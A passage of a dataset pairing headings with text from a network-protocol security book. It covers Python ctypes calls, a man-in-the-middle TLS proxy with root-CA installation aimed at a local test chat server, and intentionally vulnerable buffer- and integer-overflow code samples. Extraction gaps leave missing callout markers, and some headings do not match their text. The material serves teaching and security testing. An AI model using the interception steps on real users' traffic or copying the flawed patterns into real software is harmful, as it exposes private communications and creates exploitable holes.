Represents a single class and\nallows access to its members\njava.lang.reflect.Method Represents a method in a type\njava.lang.reflect.Field Represents a field in a type\njava.lang.reflect.Constructor Represents a class’s constructor\nYou can access a class object by name by calling the Class.forName()\nmethod. For example, Listing 8-20 shows how we would get the PackageClass.\n194 Chapter 8"
  },
  {
    "input": "Unmanaged Executables",
    "output": "Class c = Class.forName(\"com.example.PackageClass\");\nSystem.out.println(c);\nListing 8-20: Getting a class in Java\nIf we want to create an instance of a public class with a parameter-\nless constructor, the Class instance has a newInstance() method. This won’t\nwork for our package-private class, so instead we’ll get an instance of the\nConstructor by calling getDeclaredConstructor() on the Class instance. We\nneed to pass a list of Class objects to getDeclaredConstructor() to select the\ncorrect Constructor based on the types of parameters the constructor\naccepts. Listing 8-21 shows how we would choose the constructor, which\ntakes a string, and then create a new instance.\nConstructor con = c.getDeclaredConstructor(String.class);\n con.setAccessible(true);\nObject obj = con.newInstance(\"Hello\");\nListing 8-21: Creating a new instance from a private constructor\nThe code in Listing 8-21 should be fairly self-explanatory except per-\nhaps for the line at . In Java, any nonpublic member, whether a construc-\ntor, field, or method, must be set as accessible before you use it. If you don’t\ncall setAccessible() with the value true, then calling newInstance() will throw\nan exception.\nUnmanaged Executables\nCalling arbitrary code in most unmanaged executables is much more dif-\nficult than in managed platforms. Although you can call a pointer to an\ninternal function, there’s a reasonable chance that doing so could crash\nyour application. However, you can reasonably call the unmanaged imple-\nmentation when it’s explicitly exposed through a dynamic library. This sec-\ntion offers a brief overview of using the built-in Python library ctypes to call\nan unmanaged library on a Unix-like platform and Microsoft Windows.\nNOTE There are many complicated scenarios that involve calling into unmanaged code\nusing the Python ctypes library, such as passing string values or calling C++ func-\ntions. You can find several detailed resources online, but this section should give\nyou enough basics to interest you in learning more about how to use Python to call\nunmanaged libraries.\nCalling Dynamic Libraries\nLinux, macOS, and Windows support dynamic libraries. Linux calls them\nobject files (.so), macOS calls them dynamic libraries (.dylib), and Windows\ncalls them dynamic link libraries (.dll). The Python ctypes library provides a\nmostly generic way to load all of these libraries into memory and a consistent\nImplementing the Network Protocol 195\nsyntax for defining how to call the exported function. Listing 8-22 shows a\nsimple library written in C, which we’ll use as an example throughout the\nrest of the section.\n#include <stdio.h>\n#include <wchar.h>\nvoid say_hello(void) {\nprintf(\"Hello\\n\");\n}\nvoid say_string(const char* str) {\nprintf(\"%s\\n\", str);\n}\nvoid say_unicode_string(const wchar_t* ustr) {\nprintf(\"%ls\\n\", ustr);\n}\nconst char* get_hello(void) {\nreturn \"Hello from C\";\n}\nint add_numbers(int a, int b) {\nreturn a + b;\n}\nlong add_longs(long a, long b) {\nreturn a + b;\n}\nvoid add_numbers_result(int a, int b, int* c) {\n*c = a + b;\n}\nstruct SimpleStruct\n{\nconst char* str;\nint num;\n};\nvoid say_struct(const struct SimpleStruct* s) {\nprintf(\"%s %d\\n\", s->str, s->num);\n}\nListing 8-22: The example C library lib .c\nYou can compile the code in Listing 8-22 into an appropriate dynamic\nlibrary for the platform you’re testing. For example, on Linux you can com-\npile the library by installing a C compiler, such as GCC, and executing the\nfollowing command in the shell, which will generate a shared library lib.so:\ngcc -shared -fPIC -o lib.so lib.c\n196 Chapter 8\nLoading a Library with Python\nMoving to Python, we can load our library using the ctypes.cdll.LoadLibrary()\nmethod, which returns an instance of a loaded library with the exported\nfunctions attached to the instance as named methods. For example,\nListing 8-23 shows how to call the say_hello() method from the library\ncompiled in Listing 8-22.\nlisting8-23.py from ctypes import *\n# On Linux\nlib = cdll.LoadLibrary(\"./lib.so\")\n# On macOS\n#lib = cdll.LoadLibrary(\"lib.dylib\")\n# On Windows\n#lib = cdll.LoadLibrary(\"lib.dll\")\n# Or we can do the following on Windows\n#lib = cdll.lib\nlib.say_hello()\n>>> Hello\nListing 8-23: A simple Python example for calling a dynamic library\nNote that in order to load the library on Linux, you need to specify\na path. Linux by default does not include the current directory in the\nlibrary search order, so loading lib.so would fail. That is not the case on\nmacOS or on Windows. On Windows, you can simply specify the name of\nthe library after cdll and it will automatically add the .dll extension and\nload the library.\nLet’s do some exploring. Load Listing 8-23 into a Python shell, for\nexample, by running execfile(\"listing8-23.py\"), and you’ll see that Hello\nis returned. Keep the interactive session open for the next section.\nCalling More Complicated Functions\nIt’s easy enough to call a simple method, such as say_hello(), as in\nListing 8-23. But in this section, we’ll look at how to call slightly more\ncomplicated functions including unmanaged functions, which take mul-\ntiple different arguments.\nWherever possible, ctypes will attempt to determine what parameters\nare passed to the function automatically based on the parameters you pass\nin the Python script. Also, the library will always assume that the return\ntype of a method is a C integer. For example, Listing 8-24 shows how to call\nthe add_numbers() or say_string() methods along with the expected output\nfrom the interactive session.\nprint lib.add_numbers(1, 2)\n>>> 3\nImplementing the Network Protocol 197\nlib.say_string(\"Hello from Python\");\n>>> Hello from Python\nListing 8-24: Calling simple methods\nMore complex methods require the use of ctypes data types to explic-\nitly specify what types we want to use as defined in the ctypes namespace.\nTable 8-4 shows some of the more common data types.\nTable 8-4: Python ctypes and Their Native C Type Equivalent\nPython ctypes Native C types\nc_char, c_wchar char, wchar_t\nc_byte, c_ubyte char, unsigned char\nc_short, c_ushort short, unsigned short\nc_int, c_uint int, unsigned int\nc_long, c_ulong long, unsigned long\nc_longlong, c_ulonglong long long, unsigned long long (typically 64 bit)\nc_float, c_double float, double\nc_char_p, c_wchar_p char*, wchar_t* (NUL terminated strings)\nc_void_p void* (generic pointer)\nTo specify the return type, we can assign a data type to the lib.name\n.restype property. For example, Listing 8-25 shows how to call get_hello(),\nwhich returns a pointer to a string.\n# Before setting return type\nprint lib.get_hello()\n>>> -1686370079\n# After setting return type\nlib.get_hello.restype = c_char_p\nprint lib.get_hello()\n>>> Hello from C\nListing 8-25: Calling a method that returns a C string\nIf instead you want to specify the arguments to be passed to a method,\nyou can set an array of data types to the argtypes property. For example,\nListing 8-26 shows how to call add_longs() correctly.\n# Before argtypes\nlib.add_longs.restype = c_long\nprint lib.add_longs(0x100000000, 1)\n>>> 1\n# After argtypes\nlib.add_longs.argtypes = [c_long, c_long]\n198 Chapter 8\nprint lib.add_longs(0x100000000, 1)\n>>> 4294967297\nListing 8-26: Specifying argtypes for a method call\nTo pass a parameter via a pointer, use the byref helper. For example,\nadd_numbers_result() returns the value as a pointer to an integer, as shown in\nListing 8-27.\ni = c_int()\nlib.add_numbers_result(1, 2, byref(i))\nprint i.value\n>>> 3\nListing 8-27: Calling a method with a reference parameter\nCalling a Function with a Structure Parameter\nWe can define a structure for ctypes by creating a class derived from the\nStructure class and assigning the _fields_ property, and then pass the struc-\nture to the imported method. Listing 8-28 shows how to do this for the\nsay_struct() function, which takes a pointer to a structure containing a\nstring and a number.\nclass SimpleStruct(Structure):\n_fields_ = [(\"str\", c_char_p),\n(\"num\", c_int)]\ns = SimpleStruct()\ns.str = \"Hello from Struct\"\ns.num = 100\nlib.say_struct(byref(s))\n>>> Hello from Struct 100\nListing 8-28: Calling a method taking a structure\nCalling Functions with Python on Microsoft Windows\nIn this section, information on calling unmanaged libraries on Windows is\nspecific to 32-bit Windows. As discussed in Chapter 6, Windows API calls can\nspecify a number of different calling conventions, the most common being\nstdcall and cdecl. By using cdll, all calls assume that the function is cdecl, but\nthe property windll defaults instead to stdcall. If a DLL exports both cdecl and\nstdcall methods, you can mix calls through cdll and windll as necessary.\nNOTE You’ll need to consider more calling scenarios using the Python ctypes library, such as\nhow to pass back strings or call C++ functions. You can find many detailed resources\nonline, but this section should have given you enough basics to interest you in learn-\ning more about how to use Python to call unmanaged libraries.\nImplementing the Network Protocol 199"
  },
  {
    "input": "Learning About the Encryption In Use",
    "output": "encryption and dealing with tls\nEncryption on network protocols can make it difficult for you to perform\nprotocol analysis and reimplement the protocol to test for security issues.\nFortunately, most applications don’t roll their own cryptography. Instead,\nthey utilize a version of TLS, as described at the end of Chapter 7. Because\nTLS is a known quantity, we can often remove it from a protocol or reimple-\nment it using standard tools and libraries.\nLearning About the Encryption In Use\nPerhaps unsurprisingly, SuperFunkyChat has support for a TLS endpoint,\nalthough you need to configure it by passing the path to a server certificate.\nThe binary distribution of SuperFunkyChat comes with a server.pfx for this\npurpose. Restart the ChatServer application with the --server_cert parameter,\nas shown in Listing 8-29, and observe the output to ensure that TLS has been\nenabled.\n$ ChatServer --server_cert ChatServer/server.pfx\nChatServer (c) 2017 James Forshaw\nWARNING: Don't use this for a real chat system!!!\nLoaded certificate, Subject=CN=ExampleChatServer\nRunning server on port 12345 Global Bind False\nRunning TLS server on port 12346 Global Bind False\nListing 8-29: Running ChatServer with a TLS certificate\nTwo indications in the output of Listing 8-29 show that TLS has been\nenabled. First, the subject name of the server certificate is shown at .\nSecond, you can see that TLS server is listening on port 12346 .\nThere’s no need to specify the port number when connecting the client\nusing TLS with the --tls parameter: the client will automatically increment\nthe port number to match. Listing 8-30 shows how when you add the --tls\ncommand line parameter to the client, it displays basic information about\nthe connection to the console.\n$ ChatClient -–tls user1 127.0.0.1\nConnecting to 127.0.0.1:12346\n TLS Protocol: TLS v1.2\n TLS KeyEx : RsaKeyX\n TLS Cipher : Aes256\nx TLS Hash : Sha384\ny Cert Subject: CN=ExampleChatServer\nz Cert Issuer : CN=ExampleChatServer\nListing 8-30: A normal client connection\nIn this output, the TLS protocol in use is shown at  as TLS 1.2. We can\nalso see the key exchange , cipher , and hash algorithms x negotiated.\nAt y, we see some information about the server certificate, including the\nname of the Cert Subject, which typically represents the certificate owner.\nThe Cert Issuer z is the authority that signed the server’s certificate, and it’s\n200 Chapter 8"
  },
  {
    "input": "Decrypting the TLS Traffic",
    "output": "the next certificate in the chain, as described in “Public Key Infrastructure”\non page 169. In this case, the Cert Subject and Cert Issuer are the same,\nwhich typically means the certificate is self-signed.\nDecrypting the TLS Traffic\nA common technique to decrypt the TLS traffic is to actively use a man-in-\nthe-middle attack on the network traffic so you can decrypt the TLS from\nthe client and reencrypt it when sending it to the server. Of course, in the\nmiddle, you can manipulate and observe the traffic all you like. But aren’t\nman-in-the-middle attacks exactly what TLS is supposed to protect against?\nYes, but as long as we control the client application sufficiently well, we can\nusually perform this attack for testing purposes.\nAdding TLS support to a proxy (and therefore to servers and clients, as\ndiscussed earlier in this chapter) can be a simple matter of adding a single\nline or two to the proxy script to add a TLS decryption and encryption\nlayer. Figure 8-1 shows a simple example of such a proxy.\nTLS TLS\nTLS TCP TCP TLS\ndecryption encryption\nServer\nClient\nTCP port-forwarding proxy application\napplication\nTLS decryption layer\nFigure 8-1: An example MITM TLS proxy\nWe can implement the attack shown in Figure 8-1 by replacing the tem-\nplate initialization in Listing 8-5 with the code in Listing 8-31.\nvar template = new FixedProxyTemplate();\n// Local port of 4445, destination 127.0.0.1:12346\n template.LocalPort = 4445;\ntemplate.Host = \"127.0.0.1\";\ntemplate.Port = 12346;\nvar tls = new TlsNetworkLayerFactory();\n template.AddLayer(tls);\ntemplate.AddLayer<Parser>();\nListing 8-31: Adding TLS support to capture a proxy\nWe make two important changes to the template initialization. At ,\nwe increment port numbers because the client automatically adds 1 to the\nport when trying to connect over TLS. Then at , we add a TLS network\nImplementing the Network Protocol 201\nlayer to the proxy template. (Be sure to add the TLS layer before the\nparser layer, or the parser layer will try to parse the TLS network traffic,\nwhich won’t work so well.)\nWith the proxy in place, let’s repeat our test with the client from\nListing 8-31 to see the differences. Listing 8-32 shows the output.\nC:\\> ChatClient user1 127.0.0.1 --port 4444 -l\nConnecting to 127.0.0.1:4445\n TLS Protocol: TLS v1.0\n TLS KeyEx : ECDH\nTLS Cipher : Aes256\nTLS Hash : Sha1\nCert Subject: CN=ExampleChatServer\n Cert Issuer : CN=BrokenCA_PleaseFix\nListing 8-32: ChatClient connecting through a proxy\nNotice some clear changes in Listing 8-32. One is that the TLS protocol\nis now TLS v1.0  instead of TLS v1.2. Another is that the Cipher and Hash\nalgorithms differ from those in Listing 8-30, although the key exchange algo-\nrithm is using Elliptic Curve Diffie–Hellman (ECDH) for forward secrecy .\nThe final change is shown in the Cert Issuer . The proxy libraries will auto-\ngenerate a valid certificate based on the original one from the server, but it\nwill be signed with the library’s Certificate Authority (CA) certificate. If a CA\ncertificate isn’t configured, one will be generated on first use.\nForcing TLS 1.2\nThe changes to the negotiated encryption settings shown in Listing 8-32\ncan interfere with your successfully proxying applications because some\napplications will check the version of TLS negotiated. If the client will only\nconnect to a TLS 1.2 service, you can force that version by adding this line\nto the script:\ntls.Config.ServerProtocol = System.Security.Authentication.SslProtocols.Tls12;\nReplacing the Certificate with Our Own\nReplacing the certificate chain involves ensuring that the client accepts the\ncertificate that you generate as a valid root CA. Run the script in Listing 8-33\nin CANAPE.Cli to generate a new CA certificate, output it and key to a PFX\nfile, and output the public certificate in PEM format.\ngenerate_ca using System.IO;\n_cert.csx\n// Generate a 4096 bit RSA key with SHA512 hash\nvar ca = CertificateUtils.GenerateCACert(\"CN=MyTestCA\",\n4096, CertificateHashAlgorithm.Sha512);\n// Export to PFX with no password\nFile.WriteAllBytes(\"ca.pfx\", ca.ExportToPFX());\n202 Chapter 8\n// Export public certificate to a PEM file\nFile.WriteAllText(\"ca.crt\", ca.ExportToPEM());\nListing 8-33: Generating a new root CA certificate for a proxy\nOn disk, you should now find a ca.pfx file and a ca.crt file. Copy the ca.pfx\nfile into the same directory where your proxy script files are located, and add\nthe following line before initializing the TLS layer as in Listing 8-31.\nCertificateManager.SetRootCert(\"ca.pfx\");\nAll generated certificates should now use your CA certificate as the root\ncertificate.\nYou can now import ca.crt as a trusted root for your application. The\nmethod you use to import the certificate will depend on many factors, for\nexample, the type of device the client application is running on (mobile\ndevices are typically more difficult to compromise). Then there’s the ques-\ntion of where the application’s trusted root is stored. For example, is it in an\napplication binary? I’ll show just one example of importing the certificate\non Microsoft Windows.\nBecause it’s common for Windows applications to refer to the system\ntrusted root store to get their root CAs, we can import our own certificate\ninto this store and SuperFunkyChat will trust it. To do so, first run certmgr.msc\neither from the Run dialog or a command prompt. You should see the appli-\ncation window shown in Figure 8-2.\nFigure 8-2: The Windows certificate manager\nImplementing the Network Protocol 203\nChoose Trusted Root Certification Authorities4Certificates and then\nselect Action4All Tasks4Import. An import Wizard should appear. Click\nNext and you should see a dialog similar to Figure 8-3.\nFigure 8-3: Using the Certificate Import Wizard file import\nEnter the path to ca.crt or browse to it and click Next again.\nNext, make sure that Trusted Root Certification Authorities is shown in\nthe Certificate Store box (see Figure 8-4) and click Next.\nFigure 8-4: The certificate store location\nOn the final screen, click Finish; you should see the warning dialog box\nshown in Figure 8-5. Obviously, heed its warning, but click Yes all the same.\n204 Chapter 8\nNOTE Be very careful when importing arbitrary root CA certificates into your trusted root\nstore. If someone gains access to your private key, even if you were only planning\nto test a single application, they could man-in-the-middle any TLS connection you\nmake. Never install arbitrary certificates on any device you use or care about.\nFigure 8-5: A warning about importing a root CA certificate\nAs long as your application uses the system root store, your TLS proxy\nconnection will be trusted. We can test this quickly with SuperFunkyChat\nusing --verify with the ChatClient to enable server certificate verification.\nVerification is off by default to allow you to use a self-signed certificate\nfor the server. But when you run the client against the proxy server with\n--verify, the connection should fail, and you should see the following\noutput:\nSSL Policy Errors: RemoteCertificateNameMismatch\nError: The remote certificate is invalid according to the validation procedure.\nThe problem is that although we added the CA certificate as a trusted\nroot, the server name, which is in many cases specified as the subject of the\ncertificate, is invalid for the target. As we’re proxying the connection, the\nserver hostname is, for example, 127.0.0.1, but the generated certificate is\nbased on the original server’s certificate.\nTo fix this, add the following lines to specify the subject name for the\ngenerated certificate:\ntls.Config.SpecifyServerCert = true;\ntls.Config.ServerCertificateSubject = \"CN=127.0.0.1\";\nImplementing the Network Protocol 205"
  },
  {
    "input": "Final Words",
    "output": "When you retry the client, it should successfully connect to the proxy\nand then on to the real server, and all traffic should be unencrypted inside\nthe proxy.\nWe can apply the same code changes to the network client and server\ncode in Listing 8-6 and Listing 8-8. The framework will take care of ensuring\nthat only specific TLS connections are established. (You can even specify TLS\nclient certificates in the configuration for use in performing mutual authenti-\ncation, but that’s an advanced topic that’s beyond the scope of this book.)\nYou should now have some ideas about how to man-in-the-middle TLS\nconnections. The techniques you’ve learned will enable you to decrypt and\nencrypt the traffic from many applications to perform analysis and security\ntesting.\nFinal words\nThis chapter demonstrated some approaches you can take to reimplement\nyour application protocol based on the results of either doing on-the-wire\ninspection or reverse engineering the implementation. I’ve only scratched\nthe surface of this complex topic—many interesting challenges await you as\nyou investigate security issues in network protocols.\n206 Chapter 8"
  },
  {
    "input": "Chapter 9: The Root Causes of Vulnerabilities ",
    "output": "9\nTHE R OOT C AuSES Of\nvuLNER ABILITIES\nThis chapter describes the common root causes of\nsecurity vulnerabilities that result from the implemen-\ntation of a protocol. These causes are distinct from\nvulnerabilities that derive from a protocol’s specifica-\ntion (as discussed in Chapter 7). A vulnerability does\nnot have to be directly exploitable for it to be con-\nsidered a vulnerability. It might weaken the security\nstance of the protocol, making other attacks easier. Or\nit might allow access to more serious vulnerabilities.\nAfter reading this chapter, you’ll begin to see patterns in protocols that\nwill help you identify security vulnerabilities during your analysis. (I won’t\ndiscuss how to exploit the different classes until Chapter 10.)"
  },
  {
    "input": "Denial-of-Service",
    "output": "In this chapter, I’ll assume you are investigating the protocol using all\nmeans available to you, including analyzing the network traffic, reverse\nengineering the application’s binaries, reviewing source code, and manu-\nally testing the client and servers to determine actual vulnerabilities. Some\nvulnerabilities will always be easier to find using techniques such as fuzzing\n(a technique by which network protocol data is mutated to uncover issues)\nwhereas others will be easier to find by reviewing code.\nvulnerability classes\nWhen you’re dealing with security vulnerabilities, it’s useful to categorize\nthem into a set of distinct classes to assess the risk posed by the exploita-\ntion of the vulnerability. As an example, consider a vulnerability that, when\nexploited, allows an attack to compromise the system an application is run-\nning on.\nRemote Code Execution\nRemote code execution is a catchall term for any vulnerability that allows an\nattacker to run arbitrary code in the context of the application that imple-\nments the protocol. This could occur through hijacking the logic of the\napplication or influencing the command line of subprocesses created dur-\ning normal operation.\nRemote code execution vulnerabilities are usually the most security\ncritical because they allow an attacker to compromise the system on which\nthe application is executing. Such a compromise would provide the attacker\nwith access to anything the application can access and might even allow the\nhosting network to be compromised.\nDenial-of-Service\nApplications are generally designed to provide a service. If a vulnerability\nexists that when exploited causes an application to crash or become unre-\nsponsive, an attacker can use that vulnerability to deny legitimate users\naccess to a particular application and the service it provides. Commonly\nreferred to as a denial-of-service vulnerability, it requires few resources, some-\ntimes as little as a single network packet, to bring down the entire applica-\ntion. Without a doubt, this can be quite detrimental in the wrong hands.\nWe can categorize denial-of-service vulnerabilities as either persistent or\nnonpersistent. A persistent vulnerability permanently prevents legitimate users\nfrom accessing the service (at least until an administrator corrects the issue).\nThe reason is that exploiting the vulnerability corrupts some stored state that\nensures the application crashes when it’s restarted. A nonpersistent vulner-\nability lasts only as long as an attacker is sending data to cause the denial-of-\nservice condition. Usually, if the application is allowed to restart on its own or\ngiven sufficient time, service will be restored.\n208 Chapter 9"
  },
  {
    "input": "Authorization Bypass",
    "output": "Information Disclosure\nMany applications are black boxes, which in normal operation provide you\nwith only certain information over the network. An information disclosure\nvulnerability exists if there is a way to get an application to provide infor-\nmation it wasn’t originally designed to provide, such as the contents of\nmemory, filesystem paths, or authentication credentials. Such information\nmight be directly useful to an attacker because it could aid further exploita-\ntion. For example, the information could disclose the location of important\nin-memory structures that could help in remote code execution.\nAuthentication Bypass\nMany applications require users to supply authentication credentials to\naccess an application completely. Valid credentials might be a username\nand password or a more complex verification, like a cryptographically\nsecure exchange. Authentication limits access to resources, but it can also\nreduce an application’s attack surface when an attacker is unauthenticated.\nAn authentication bypass vulnerability exists in an application if there is\na way to authenticate to the application without providing all the authen-\ntication credentials. Such vulnerabilities might be as simple as an applica-\ntion incorrectly checking a password—for example, because it compares a\nsimple checksum of the password, which is easy to brute force. Or vulner-\nabilities could be due to more complex issues, such as SQL injection (dis-\ncussed later in “SQL Injection” on page 228).\nAuthorization Bypass\nNot all users are created equal. Applications may support different types of\nusers, such as read-only, low-privilege, or administrator, through the same\ninterface. If an application provides access to resources like files, it might\nneed to restrict access based on authentication. To allow access to secured\nresources, an authorization process must be built in to determine which\nrights and resources have been assigned to a user.\nAn authorization bypass vulnerability occurs when an attacker can gain\nextra rights or access to resources they are not privileged to access. For\nexample, an attacker might change the authenticated user or user privi-\nleges directly, or a protocol might not correctly check user permissions.\nNOTE Don’t confuse authorization bypass with authentication bypass vulnerabilities.\nThe major difference between the two is that an authentication bypass allows you\nto authenticate as a specific user from the system’s point of view; an authorization\nbypass allows an attacker to access a resource from an incorrect authentication state\n(which might in fact be unauthenticated).\nHaving defined the vulnerability classes, let’s look at their causes in more\ndetail and explore some of the protocol structures in which you’ll find them.\nThe Root Causes of Vulnerabilities 209"
  },
  {
    "input": "Memory Buffer Overflows ",
    "output": "Each type of root cause contains a list of the possible vulnerability classes that\nit might lead to. Although this is not an exhaustive list, I cover those you are\nmost likely to encounter regularly.\nMemory corruption vulnerabilities\nIf you’ve done any analysis, memory corruption is most likely the primary\nsecurity vulnerability you’ll have encountered. Applications store their cur-\nrent state in memory, and if that memory can be corrupted in a controlled\nway, the result can cause any class of security vulnerability. Such vulner-\nabilities can simply cause an application to crash (resulting in a denial-of-\nservice condition) or be more dangerous, such as allowing an attacker to\nrun executable code on the target system.\nMemory-Safe vs. Memory-Unsafe Programming Languages\nMemory corruption vulnerabilities are heavily dependent on the pro-\ngramming language the application was developed in. When it comes to\nmemory corruption, the biggest difference between languages is tied to\nwhether a language (and its hosting environment) is memory safe or memory\nunsafe. Memory-safe languages, such as Java, C#, Python, and Ruby, do not\nnormally require the developer to deal with low-level memory manage-\nment. They sometimes provide libraries or constructs to perform unsafe\noperations (such as C#’s unsafe keyword). But using these libraries or con-\nstructs requires developers to make their use explicit, which allows that\nuse to be audited for safety. Memory-safe languages will also commonly\nperform bounds checking for in-memory buffer access to prevent out-of-\nbounds reads and writes. Just because a language is memory safe doesn’t\nmean it’s completely immune to memory corruption. However, corruption\nis more likely to be a bug in the language runtime than a mistake by the\noriginal developer.\nOn the other hand, memory-unsafe languages, such as C and C++,\nperform very little memory access verification and lack robust mechanisms\nfor automatically managing memory. As a result, many types of memory\ncorruption can occur. How exploitable these vulnerabilities are depends\non the operating system, the compiler used, and how the application is\nstructured.\nMemory corruption is one of the oldest and best known root causes of\nvulnerabilities; therefore, considerable effort has been made to eliminate it.\n(I’ll discuss some of the mitigation strategies in more depth in Chapter 10\nwhen I detail how you might exploit these vulnerabilities.)\nMemory Buffer Overflows\nPerhaps the best known memory corruption vulnerability is a buffer overflow.\nThis vulnerability occurs when an application tries to put more data into a\nregion of memory than that region was designed to hold. Buffer overflows\n210 Chapter 9\nmay be exploited to get arbitrary programs to run or to bypass security\nrestrictions, such as user access controls. Figure 9-1 shows a simple buf-\nfer overflow caused by input data that is too large for the allocated buffer,\nresulting in memory corruption.\nAllocated buffer Corruption\n0 0 0 0 0 ? ? ? ?\n'A' 'A' 'A' 'A' 'A' 'A' 'A' 'A'\nInput buffer\nFigure 9-1: Buffer overflow memory corruption\nBuffer overflows can occur for either of two reasons: Commonly referred\nto as a fixed-length buffer overflow, an application incorrectly assumes the input\nbuffer will fit into the allocated buffer. A variable-length buffer overflow occurs\nbecause the size of the allocated buffer is incorrectly calculated.\nFixed-Length Buffer Overflows\nBy far, the simplest buffer overflow occurs when an application incorrectly\nchecks the length of an external data value relative to a fixed-length buffer\nin memory. That buffer might reside on the stack, be allocated on a heap,\nor exist as a global buffer defined at compile time. The key is that the mem-\nory length is determined prior to knowledge of the actual data length.\nThe cause of the overflow depends on the application, but it can be\nas simple as the application not checking length at all or checking length\nincorrectly. Listing 9-1 is an example.\ndef read_string()\n{\n byte str[32];\nint i = 0;\ndo\n{\n str[i] = read_byte();\ni = i + 1;\n}\n while(str[i-1] != 0);\nprintf(\"Read String: %s\\n\", str);\n}\nListing 9-1: A simple fixed-length buffer overflow\nThis code first allocates the buffer where it will store the string (on the\nstack) and allocates 32 bytes of data . Next, it goes into a loop that reads a\nThe Root Causes of Vulnerabilities 211\nbyte from the network and stores it an incrementing index in the buffer .\nThe loop exits when the last byte read from the network is equal to zero,\nwhich indicates that the value has been sent .\nIn this case, the developer has made a mistake: the loop doesn’t verify\nthe current length at  and therefore reads as much data as available\nfrom the network, leading to memory corruption. Of course, this problem\nis due to the fact that unsafe programming languages do not perform\nbounds checks on arrays. This vulnerability might be very simple to exploit\nif no compiler mitigations are in place, such as stack cookies to detect the\ncorruption.\nuNSAfE STRING fuNCTIONS\nThe C programming language does not define a string type . Instead, it uses\nmemory pointers to a list of char types . The end of the string is indicated by a\nzero-value character . This isn’t a security problem directly . However, when the\nbuilt-in libraries to manipulate strings were developed, safety was not consid-\nered . Consequently, many of these string functions are very dangerous to use in\na security-critical application .\nTo understand how dangerous these functions can be, let’s look at an\nexample using strcpy, the function that copies strings. This function takes only\ntwo arguments: a pointer to the source string and a pointer to the destination\nmemory buffer to store the copy . Notice that nothing indicates the length of the\ndestination memory buffer . And as you’ve already seen, a memory-unsafe lan-\nguage like C doesn’t keep track of buffer sizes . If a programmer tries to copy a\nstring that is longer than the destination buffer, especially if it’s from an external\nuntrusted source, memory corruption will occur .\nMore recent C compilers and standardizations of the language have added\nmore secure versions of these functions, such as strcpy_s, which adds a destina-\ntion length argument . But if an application uses an older string function, such as\nstrcpy, strcat, or sprintf, then there’s a good chance of a serious memory cor-\nruption vulnerability .\nEven if a developer performs a length check, that check may not be done\ncorrectly. Without automatic bounds checking on array access, it is up to the\ndeveloper to verify all reads and writes. Listing 9-2 shows a corrected version\nof Listing 9-1 that takes into account strings that are longer than the buffer\nsize. Still, even with the fix, a vulnerability is lurking in the code.\ndef read_string_fixed()\n{\n byte str[32];\nint i = 0;\n212 Chapter 9\ndo\n{\n str[i] = read_byte();\ni = i + 1;\n}\n while((str[i-1] != 0) && (i < 32));\n/* Ensure zero terminated if we ended because of length */\nx str[i] = 0;\nprintf(\"Read String: %s\\n\", str);\n}\nListing 9-2: An off-by-one buffer overflow\nAs in Listing 9-1, at  and , the code allocates a fixed-stack buffer\nand reads the string in a loop. The first difference is at . The developer\nhas added a check to make sure to exit the loop if it has already read 32\nbytes, the maximum the stack buffer can hold. Unfortunately, to ensure\nthat the string buffer is suitably terminated, a zero byte is written to the last\nposition available in the buffer x. At this point, i has the value of 32. But\nbecause languages like C start buffer indexing from 0, this actually means it\nwill write 0 to the 33rd element of the buffer, thereby causing corruption, as\nshown in Figure 9-2.\nAllocated buffer\n0 0 . . . 0 0 ? ? ?\nstr[0] str[30] str[32]\nFigure 9-2: An off-by-one error memory corruption\nThis results in an off-by-one error (due to the shift in index position), a\ncommon error in memory-unsafe languages with zero-based buffer index-\ning. If the overwritten value is important—for example, if it is the return\naddress for the function—this vulnerability can be exploitable.\nVariable-Length Buffer Overflows\nAn application doesn’t have to use fixed-length buffers to stored protocol\ndata. In most situations, it’s possible for the application to allocate a buf-\nfer of the correct size for the data being stored. However, if the application\nincorrectly calculates the buffer size, a variable-length buffer overflow can\noccur.\nAs the length of the buffer is calculated at runtime based on the length\nof the protocol data, you might think a variable-length buffer overflow is\nunlikely to be a real-world vulnerability. But this vulnerability can still occur\nThe Root Causes of Vulnerabilities 213\nin a number of ways. For one, an application might simply incorrectly cal-\nculate the buffer length. (Applications should be rigorously tested prior to\nbeing made generally available, but that’s not always the case.)\nA bigger issue occurs if the calculation induces undefined behavior by\nthe language or platform. For example, Listing 9-3 demonstrates a common\nway in which the length calculation is incorrect.\ndef read_uint32_array()\n{\nuint32 len;\nuint32[] buf;\n// Read the number of words from the network\n len = read_uint32();\n// Allocate memory buffer\n buf = malloc(len * sizeof(uint32));\n// Read values\nfor(uint32 i = 0; i < len; ++i)\n{\n buf[i] = read_uint32();\n}\nprintf(\"Read in %d uint32 values\\n\", len);\n}\nListing 9-3: An incorrect allocation length calculation\nHere the memory buffer is dynamically allocated at runtime to contain\nthe total size of the input data from the protocol. First, the code reads a\n32-bit integer, which it uses to determine the number of following 32-bit\nvalues in the protocol . Next, it determines the total allocation size and\nthen allocates a buffer of a corresponding size . Finally, the code starts a\nloop that reads each value from the protocol into the allocated buffer .\nWhat could possibly go wrong? To answer, let’s take a quick look at\ninteger overflows.\nInteger Overflows\nAt the processor instruction level, integer arithmetic operations are com-\nmonly performed using modulo arithmetic. Modulo arithmetic allows values\nto wrap if they go above a certain value, which is called the modulus. A pro-\ncessor uses modulo arithmetic if it supports only a certain native integer\nsize, such as 32 or 64 bits. This means that the result of any arithmetic oper-\nation must always be within the ranges allowed for the fixed-size integer\nvalue. For example, an 8-bit integer can take only the values between 0 and\n255; it cannot possibly represent any other values. Figure 9-3 shows what\nhappens when you multiply a value by 4, causing the integer to overflow.\n214 Chapter 9\nMSB LSB\n× 4 0 1 0 0 0 0 0 1 Original length: 0x41\n1 0 0 0 0 0 1 0 0 Overflowed length: 0x104\n= 0 0 0 0 0 1 0 0 Allocation length: 0x04\nFigure 9-3: A simple integer overflow\nAlthough this figure shows 8-bit integers for the sake of brevity, the same\nlogic applies to 32-bit integers. When we multiply the original length 0x41\nor 65 by 4, the result is 0x104 or 260. That result can’t possibly fit into an\n8-bit integer with a range of 0 to 255. So the processor drops the overflowed\nbit (or more likely stores it in a special flag indicating that an overflow has\noccurred), and the result is the value 4—not what we expected. The proces-\nsor might issue an error to indicate that an overflow has occurred, but mem-\nory-unsafe programming languages typically ignore this sort of error. In fact,\nthe act of wrapping the integer value is used in architectures such as x86 to\nindicate the signed result of an operation. Higher-level languages might indi-\ncate the error, or they might not support integer overflow at all, for instance,\nby extending the size of the integer on demand.\nReturning to Listing 9-3, you can see that if an attacker supplies a suit-\nably chosen value for the buffer length, the multiplication by 4 will over-\nflow. This results in a smaller number being allocated to memory than is\nbeing transmitted over the network. When the values are being read from\nthe 